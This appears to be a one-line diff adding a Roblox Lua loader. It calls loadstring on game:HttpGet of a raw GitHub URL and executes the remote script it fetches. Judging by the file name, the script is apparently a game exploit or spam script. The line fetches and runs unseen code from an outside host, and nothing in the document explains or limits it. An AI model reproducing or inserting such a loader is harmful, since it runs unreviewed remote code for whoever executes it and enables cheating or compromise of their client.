@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/hush-they-can-hear-beta-spam3-5ceddkzwmbtmgk.lua"))()
